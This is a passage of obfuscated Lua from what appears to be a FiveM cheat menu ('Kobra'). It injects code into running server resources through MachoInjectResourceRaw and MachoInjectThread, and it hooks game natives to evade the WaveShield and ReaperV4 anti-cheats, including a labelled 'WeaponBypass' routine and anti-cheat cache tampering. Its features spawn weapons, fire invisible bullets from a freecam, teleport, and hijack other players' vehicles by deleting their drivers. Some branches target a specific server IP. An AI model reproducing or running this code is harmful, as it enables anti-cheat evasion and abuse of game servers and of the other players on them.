                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield WeaponBypass error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            local ped = %d
                                            if _g(_b("DoesEntityExist"))(ped) then
                                                local weaponName = _d({%s})
                                                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                                                if weaponHash and weaponHash ~= 0 then
                                                    _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                                                    _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                                                end
                                            end
                                        end)

                                        print("Zawg")
                                    ]],v1449,v1452));Wait(453 -(72 + 31) );v1442=6;end if (v1442==2) then hNative("SetCurrentPedWeapon",function(v1633,...) return v1633(...);end);hNative("GetCurrentPedWeapon",function(v1634,...) return v1634(...);end);hNative("RemoveWeaponFromPed",function(v1635,...) return;end);hNative("ShootSingleBulletBetweenCoords",function(v1636,...) return v1636(...);end);v1442=351 -(89 + 259) ;end if (v1442==(6 + 0)) then ShootSingleBulletBetweenCoords(v1444.x,v1444.y,v1444.z,v1448.x,v1448.y,v1448.z,88 + 12 ,true,v1450,PlayerPedId(),true,false,19597 + 80403 );break;end end end else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                                    if _G.KobraFreecamObject then
                                        local function RotationToDirection(rot)
                                            local z = math.rad(rot.z)
                                            local x = math.rad(rot.x)
                                            local num = math.abs(math.cos(x))
                                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                        end

                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)
                                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                        local camCoords = GetCamCoord(_G.KobraFreecamObject)
                                        local camRot = GetCamRot(_G.KobraFreecamObject, 2)
                                        local forward = RotationToDirection(camRot)
                                        local rayLength = 1000.0
                                        local targetPos = camCoords + forward * rayLength
                                        local playerPed = PlayerPedId()
                                        local weaponHash = GetHashKey("]]   .. v1013   .. [[")

                                        GiveWeaponToPed(PlayerPedId(), weaponHash, 13500, false, true)
                                        SetCurrentPedWeapon(PlayerPedId(), weaponHash, true)
                                        ShootSingleBulletBetweenCoords(
                                            camCoords.x, camCoords.y, camCoords.z,
                                            targetPos.x, targetPos.y, targetPos.z,
                                            100,           -- damage
                                            true,          -- isAudible
                                            weaponHash,
                                            playerPed,
                                            true,          -- isInvisible
                                            false,         -- isCritical
                                            100000.0         -- speed
                                        )
                                    end
                                ]] );end elseif _G.KobraFreecamObject then local v1350=0 -0 ;local v1351;local v1352;local v1353;local v1354;local v1355;local v1356;local v1357;local v1358;while true do if (v1350==3) then v1353=GetCamRot(_G.KobraFreecamObject,2);v1354=v1351(v1353);v1355=647 + 353 ;v1356=v1352 + (v1354 * v1355) ;v1350=7 -3 ;end if (v1350==5) then Wait(1653 -(1333 + 70) );ShootSingleBulletBetweenCoords(v1352.x,v1352.y,v1352.z,v1356.x,v1356.y,v1356.z,100,true,v1358,v1357,true,false,101832 -(701 + 1131) );break;end if (v1350==(128 -(55 + 72))) then hNative("Wait",function(v1533,...) return v1533(...);end);hNative("PlayerPedId",function(v1534,...) return v1534(...);end);hNative("GetHashKey",function(v1535,...) return v1535(...);end);hNative("GiveWeaponToPed",function(v1536,...) return v1536(...);end);v1350=158 -(99 + 57) ;end if (v1350==(2 -0)) then hNative("SetCurrentPedWeapon",function(v1537,...) return v1537(...);end);hNative("GetCurrentPedWeapon",function(v1538,...) return v1538(...);end);hNative("RemoveWeaponFromPed",function(v1539,...) return;end);v1352=GetCamCoord(_G.KobraFreecamObject);v1350=2 + 1 ;end if (v1350==4) then v1357=PlayerPedId();v1358=GetHashKey(v1013);GiveWeaponToPed(v1357,v1358,255,false,true);MachoInjectThread(1579 -(1243 + 336) ,"ReaperV4","",[[
                                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "Weapon:" .. ]]   .. v1358   .. [[, true, true)
                                    if success then
                                        print("Updated Cache Successfully")
                                    else
                                        print("Failed to Update Cache")
                                    end
                                ]] );v1350=5;end if (v1350==0) then v1351=nil;function v1351(v1540) local v1541=1329 -(774 + 555) ;local v1542;local v1543;local v1544;while true do if ((1 + 0)==v1541) then v1544=math.abs(math.cos(v1543));return vector3( -math.sin(v1542) * v1544 ,math.cos(v1542) * v1544 ,math.sin(v1543));end if (v1541==(799 -(150 + 649))) then v1542=math.rad(v1540.z);v1543=math.rad(v1540.x);v1541=1 + 0 ;end end end function hNative(v1545,v1546) local v1547=_G[v1545];if ( not v1547 or (type(v1547)~="function")) then return;end _G[v1545]=function(...) return v1546(v1547,...);end;end hNative("CreateThread",function(v1548,...) return v1548(...);end);v1350=1 -0 ;end end end elseif ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then if _G.KobraFreecamObject then local v1453=0 -0 ;local v1454;local v1455;local v1456;local v1457;local v1458;local v1459;local v1460;local v1461;local v1462;local v1463;while true do if (0==v1453) then print("UPP3R");v1454=nil;function v1454(v1637) local v1638=math.rad(v1637.z);local v1639=math.rad(v1637.x);local v1640=math.abs(math.cos(v1639));return vector3( -math.sin(v1638) * v1640 ,math.cos(v1638) * v1640 ,math.sin(v1639));end function hNative(v1641,v1642) local v1643=1984 -(1122 + 862) ;local v1644;while true do if ((0 -0)==v1643) then v1644=_G[v1641];if ( not v1644 or (type(v1644)~="function")) then return;end v1643=1 + 0 ;end if (v1643==(1 -0)) then _G[v1641]=function(...) return v1642(v1644,...);end;break;end end end v1453=1 + 0 ;end if (3==v1453) then hNative("ShootSingleBulletBetweenCoords",function(v1645,...) return v1645(...);end);v1455=GetCamCoord(_G.KobraFreecamObject);v1456=GetCamRot(_G.KobraFreecamObject,1 + 1 );v1457=v1454(v1456);v1453=747 -(549 + 194) ;end if (v1453==(4 + 1)) then v1462=nil;function v1462(v1646) local v1647=0 -0 ;local v1648;while true do if (v1647==(1 + 0)) then return table.concat(v1648,",");end if (v1647==0) then v1648={};for v1721=1, #v1646 do v1648[v1721]=string.byte(v1646,v1721);end v1647=1;end end end v1463=v1462(v1013);v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,string.format([[
                                        if not _G.osintWeaponBypass then
                                            _G.osintWeaponBypass = { enabled = false }
                                        end
                                        _G.osintWeaponBypass.enabled = true

                                        local function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        hNative("GetHashKey", function(orig, str) return orig(str) end)
                                        hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, ammo, false, true)
                                            else
                                                return orig(ped, hash, ammo, isHidden, equipNow)
                                            end
                                        end)
                                        hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, true)
                                            else
                                                return orig(ped, hash, equipNow)
                                            end
                                        end)

                                        local function _b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return t
                                        end
                                        local function _d(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end
                                        local function _g(n)
                                            local k = _d(n)
                                            local f = _G[k]
                                            return f
                                        end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield WeaponBypass error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            local ped = %d
                                            if _g(_b("DoesEntityExist"))(ped) then
                                                local weaponName = _d({%s})
                                                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                                                if weaponHash and weaponHash ~= 0 then
                                                    _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                                                    _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                                                end
                                            end
                                        end)

                                        print("Zawg")
                                    ]],v1460,v1463));v1453=8 -2 ;end if (v1453==6) then Wait(128 + 22 );ShootSingleBulletBetweenCoords(v1455.x,v1455.y,v1455.z,v1459.x,v1459.y,v1459.z,100,true,v1461,v1460,true,false,100000);break;end if (1==v1453) then hNative("CreateThread",function(v1649,...) return v1649(...);end);hNative("Wait",function(v1650,...) return v1650(...);end);hNative("PlayerPedId",function(v1651,...) return v1651(...);end);hNative("GetHashKey",function(v1652,...) return v1652(...);end);v1453=2;end if (v1453==4) then v1458=1000;v1459=v1455 + (v1457 * v1458) ;v1460=PlayerPedId();v1461=GetHashKey(v1013);v1453=17 -12 ;end if (v1453==2) then hNative("GiveWeaponToPed",function(v1653,...) return v1653(...);end);hNative("SetCurrentPedWeapon",function(v1654,...) return v1654(...);end);hNative("GetCurrentPedWeapon",function(v1655,...) return v1655(...);end);hNative("RemoveWeaponFromPed",function(v1656,...) return;end);v1453=1706 -(453 + 1250) ;end end end else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                                    if _G.KobraFreecamObject then
                                        local function RotationToDirection(rot)
                                            local z = math.rad(rot.z)
                                            local x = math.rad(rot.x)
                                            local num = math.abs(math.cos(x))
                                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                        end

                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)
                                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                        local camCoords = GetCamCoord(_G.KobraFreecamObject)
                                        local camRot = GetCamRot(_G.KobraFreecamObject, 2)
                                        local forward = RotationToDirection(camRot)
                                        local rayLength = 1000.0
                                        local targetPos = camCoords + forward * rayLength
                                        local playerPed = PlayerPedId()
                                        local weaponHash = GetHashKey("]]   .. v1013   .. [[")

                                        ShootSingleBulletBetweenCoords(
                                            camCoords.x, camCoords.y, camCoords.z,
                                            targetPos.x, targetPos.y, targetPos.z,
                                            100,           -- damage
                                            true,          -- isAudible
                                            weaponHash,
                                            playerPed,
                                            true,          -- isInvisible
                                            false,         -- isCritical
                                            100000.0         -- speed
                                        )
                                    end
                                ]] );end elseif _G.KobraFreecamObject then local function v1359(v1410) local v1411=0;local v1412;local v1413;local v1414;while true do if (v1411==1) then v1414=math.abs(math.cos(v1413));return vector3( -math.sin(v1412) * v1414 ,math.cos(v1412) * v1414 ,math.sin(v1413));end if (v1411==0) then v1412=math.rad(v1410.z);v1413=math.rad(v1410.x);v1411=1;end end end function hNative(v1415,v1416) local v1417=0 -0 ;local v1418;while true do if (v1417==0) then v1418=_G[v1415];if ( not v1418 or (type(v1418)~="function")) then return;end v1417=1;end if (v1417==1) then _G[v1415]=function(...) return v1416(v1418,...);end;break;end end end hNative("CreateThread",function(v1419,...) return v1419(...);end);hNative("Wait",function(v1420,...) return v1420(...);end);hNative("PlayerPedId",function(v1421,...) return v1421(...);end);hNative("GetHashKey",function(v1422,...) return v1422(...);end);hNative("GiveWeaponToPed",function(v1423,...) return v1423(...);end);hNative("SetCurrentPedWeapon",function(v1424,...) return v1424(...);end);hNative("GetCurrentPedWeapon",function(v1425,...) return v1425(...);end);hNative("RemoveWeaponFromPed",function(v1426,...) return;end);local v1360=GetCamCoord(_G.KobraFreecamObject);local v1361=GetCamRot(_G.KobraFreecamObject,2);local v1362=v1359(v1361);local v1363=1000;local v1364=v1360 + (v1362 * v1363) ;local v1365=PlayerPedId();local v1366=GetHashKey(v1013);GiveWeaponToPed(PlayerPedId(),v1366,237 + 13 ,false,true);SetCurrentPedWeapon(PlayerPedId(),v1366,true);ShootSingleBulletBetweenCoords(v1360.x,v1360.y,v1360.z,v1364.x,v1364.y,v1364.z,675 -(203 + 372) ,true,v1366,v1365,true,false,4716 + 95284 );end end end if IsDisabledControlJustPressed(0,69 -45 ) then local v836=v658;if (v836=="Teleport") then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then if _G.KobraFreecamObject then local v1367=1382 -(978 + 404) ;local v1368;local v1369;local v1370;local v1371;local v1372;local v1373;local v1374;local v1375;local v1376;local v1377;local v1378;while true do if (v1367==(9 -6)) then v1375,v1376,v1377,v1375,v1378=GetShapeTestResult(v1374);if v1376 then if ((v1378~=(0 + 0)) and IsEntityAVehicle(v1378)) then local v1658=318 -(56 + 262) ;local v1659;local v1660;local v1661;while true do if (v1658==1) then v1661=GetEmptySeat(v1659);if (v1661== -(1 + 0)) then TaskWarpPedIntoVehicle(v1660,v1659, -(115 -(108 + 6)));elseif (v1661>=0) then TaskWarpPedIntoVehicle(v1660,v1659,v1661);else print("[^5SYNC^7]: There aren't any seats available in this vehicle.");end break;end if (v1658==0) then v1659=v1378;v1660=PlayerPedId();v1658=1 + 0 ;end end else SetEntityCoords(PlayerPedId(),v1377.x,v1377.y,v1377.z,false,false,false,false);end else print("[^5SYNC^7]: There aren't any valid locations to teleport to.");end break;end if ((2 + 0)==v1367) then v1372=2952 -(653 + 1299) ;v1373=v1369 + (v1371 * v1372) ;v1374=StartShapeTestRay(v1369.x,v1369.y,v1369.z,v1373.x,v1373.y,v1373.z, -(1 + 0),PlayerPedId(),0 + 0 );v1367=3;end if (v1367==(2 -1)) then v1369=GetCamCoord(_G.KobraFreecamObject);v1370=GetCamRot(_G.KobraFreecamObject,1924 -(1042 + 880) );v1371=v1368(v1370);v1367=1 + 1 ;end if (v1367==(1002 -(16 + 986))) then v1368=nil;function v1368(v1549) local v1550=math.rad(v1549.z);local v1551=math.rad(v1549.x);local v1552=math.abs(math.cos(v1551));return vector3( -math.sin(v1550) * v1552 ,math.cos(v1550) * v1552 ,math.sin(v1551));end function GetEmptySeat(v1553) local v1554={ -(1219 -(700 + 518)),0 -0 ,1,3 -1 };for v1608,v1609 in ipairs(v1554) do if IsVehicleSeatFree(v1553,v1609) then return v1609;end end return  -1;end v1367=459 -(271 + 187) ;end end end else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                                if _G.KobraFreecamObject then
                                    local function RotationToDirection(rot)
                                        local z = math.rad(rot.z)
                                        local x = math.rad(rot.x)
                                        local num = math.abs(math.cos(x))
                                        return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                    end

                                    function GetEmptySeat(vehicle)
                                        local seats = {
                                            -1, 0, 1, 2
                                        }

                                        for _, seat in ipairs(seats) do
                                            if IsVehicleSeatFree(vehicle, seat) then
                                                return seat
                                            end
                                        end

                                        return -1
                                    end

                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then
                                            return
                                        end

                                        _G[nativeName] = function(...)
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetEmptySeat", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                    hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                    hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetEntityCoordsWithoutPlantsReset", function(originalFn, ...) return originalFn(...) end)

                                    local camCoords = GetCamCoord(_G.KobraFreecamObject)
                                    local rot = GetCamRot(_G.KobraFreecamObject, 2)
                                    local forward = RotationToDirection(rot)
                                    local rayLength = 1000.0
                                    local targetPos = camCoords + forward * rayLength
                                    local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, PlayerPedId(), 0)
                                    local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                                    if hit then
                                        if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                            local vehicle = entityHit
                                            local playerPed = PlayerPedId()
                                            local seat = GetEmptySeat(vehicle)
                                            if seat == -1 then
                                                TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                                            elseif seat >= 0 then
                                                TaskWarpPedIntoVehicle(playerPed, vehicle, seat)
                                            else
                                                print("[^5Kobra^7]: There aren't any seats available in this vehicle.")
                                            end
                                        else
                                            SetEntityCoordsWithoutPlantsReset(PlayerPedId(), endCoords.x, endCoords.y, endCoords.z, false, false, false, false)
                                        end
                                    else
                                        print("[^5Kobra^7]: There aren't any valid locations to teleport to.")
                                    end
                                end
                            ]]);end elseif _G.KobraFreecamObject then local function v1248(v1290) local v1291=0;local v1292;local v1293;local v1294;while true do if (v1291==0) then v1292=math.rad(v1290.z);v1293=math.rad(v1290.x);v1291=1585 -(731 + 853) ;end if (v1291==(3 -2)) then v1294=math.abs(math.cos(v1293));return vector3( -math.sin(v1292) * v1294 ,math.cos(v1292) * v1294 ,math.sin(v1293));end end end function GetEmptySeat(v1295) local v1296={ -1,0,1,1662 -(1291 + 369) };for v1379,v1380 in ipairs(v1296) do if IsVehicleSeatFree(v1295,v1380) then return v1380;end end return  -(1 + 0);end local v1249=GetCamCoord(_G.KobraFreecamObject);local v1250=GetCamRot(_G.KobraFreecamObject,1 + 1 );local v1251=v1248(v1250);local v1252=1000;local v1253=v1249 + (v1251 * v1252) ;local v1254=StartShapeTestRay(v1249.x,v1249.y,v1249.z,v1253.x,v1253.y,v1253.z, -1,PlayerPedId(),0 + 0 );local v1255,v1256,v1257,v1255,v1258=GetShapeTestResult(v1254);if v1256 then if ((v1258~=(0 + 0)) and IsEntityAVehicle(v1258)) then local v1464=685 -(561 + 124) ;local v1465;local v1466;local v1467;while true do if (v1464==(0 + 0)) then v1465=v1258;v1466=PlayerPedId();v1464=854 -(25 + 828) ;end if (v1464==1) then v1467=GetEmptySeat(v1465);if (v1467== -(2 -1)) then TaskWarpPedIntoVehicle(v1466,v1465, -(1 -0));elseif (v1467>=0) then TaskWarpPedIntoVehicle(v1466,v1465,v1467);else print("[^5Kobra^7]: There aren't any seats available in this vehicle.");end break;end end else MachoInjectThread(0,"any","",[[ 
                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetRightVector", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Clamp", function(originalFn, ...) return originalFn(...) end)
                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                        hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                                        hNative("DoesCamExist", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                                        hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                                        hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                                        hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                                        hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                                        hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                                        hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                                        hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                        hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                        SetEntityCoords(PlayerPedId(), ]]   .. v1257.x   .. [[, ]]   .. v1257.y   .. [[, ]]   .. v1257.z   .. [[, false, false, false, false)
                                    ]] );end else print("[^5Kobra^7]: There aren't any valid locations to teleport to.");end end elseif (v836=="Kick from Vehicle") then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then local v1259=((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ;v48(v1259,[[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G[FLAG_CAM])
                            local rot = GetCamRot(_G[FLAG_CAM], 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function HijackCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        DeletePed(driver)
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                    Wait(100)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        HijackCar(vehicle)
                                    end
                                end
                            end)
                        ]]);elseif _G.KobraFreecamObject then local v1381=590 -(99 + 491) ;local v1382;local v1383;local v1384;local v1385;local v1386;local v1387;local v1388;local v1389;local v1390;local v1391;local v1392;local v1393;local v1394;local v1395;local v1396;while true do if (v1381==0) then function hNative(v1555,v1556) local v1557=48 -(18 + 30) ;local v1558;while true do if (1==v1557) then _G[v1555]=function(...) return v1556(v1558,...);end;break;end if (v1557==0) then v1558=_G[v1555];if ( not v1558 or (type(v1558)~="function")) then return;end v1557=2 -1 ;end end end hNative("CreateThread",function(v1559,...) return v1559(...);end);hNative("Wait",function(v1560,...) return v1560(...);end);hNative("DoesEntityExist",function(v1561,...) return v1561(...);end);hNative("GetEntityCoords",function(v1562,...) return v1562(...);end);hNative("GetCamCoord",function(v1563,...) return v1563(...);end);v1381=1;end if ((1 -0)==v1381) then hNative("GetCamRot",function(v1564,...) return v1564(...);end);hNative("StartShapeTestRay",function(v1565,...) return v1565(...);end);hNative("GetShapeTestResult",function(v1566,...) return v1566(...);end);hNative("GetPedInVehicleSeat",function(v1567,...) return v1567(...);end);hNative("SetEntityVisible",function(v1568,...) return v1568(...);end);hNative("DeletePed",function(v1569,...) return v1569(...);end);v1381=2 -0 ;end if (v1381==(2 + 3)) then v1390=v1386 + (v1388 * v1389) ;v1391=StartShapeTestRay(v1386.x,v1386.y,v1386.z,v1390.x,v1390.y,v1390.z, -(3 -2),v1384,732 -(501 + 231) );v1392,v1393,v1394,v1392,v1395=GetShapeTestResult(v1391);v1396=nil;function v1396(v1570) local v1571=0;local v1572;while true do if ((1 + 0)==v1571) then if ((v1572~=(1698 -(470 + 1228))) and DoesEntityExist(v1572)) then local v1711=0 + 0 ;while true do if (0==v1711) then SetPedIntoVehicle(v1384,v1570,0 + 0 );v1382(v1570,2686 -(537 + 149) );Wait(10);for v1747=0 -0 ,3 + 1  